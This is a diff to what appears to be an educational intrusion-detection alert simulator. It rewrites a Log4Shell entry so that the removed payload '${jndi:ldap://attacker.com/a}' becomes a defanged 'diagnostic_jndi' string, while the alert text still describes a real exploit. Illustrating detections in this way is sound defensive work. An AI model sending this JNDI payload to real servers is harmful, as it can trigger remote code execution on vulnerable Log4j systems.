@@ -98,10 +98,10 @@ const Topic0 = () => {
     },
     log4shell_jndi_exploit: {
       id: "log4shell_jndi_exploit",
-      label: "Zero-Day Log4Shell Exploit Injection (${jndi:ldap://...})",
+      label: "Zero-Day Log4Shell Diagnostic Probe (${diagnostic_jndi:ldap://...})",
       src: "198.51.100.88:51200",
       dst: "172.16.1.10:443 [ACK]",
-      tcpFlags: "ACK (Payload: ${jndi:ldap://attacker.com/a})",
+      tcpFlags: "ACK (Payload: ${diagnostic_jndi:ldap://test.internal/a})",
       verdict: "🚨 CRITICAL ALERT: EXPLOIT Log4j JNDI RCE Attempt (SID-1003)",
       badgeColor: "bg-purple-950 text-purple-300 border-purple-700",
       explanation: "Deep byte stream signature matched JNDI lookup string in User-Agent header; alert forwarded to SIEM within 45 milliseconds."
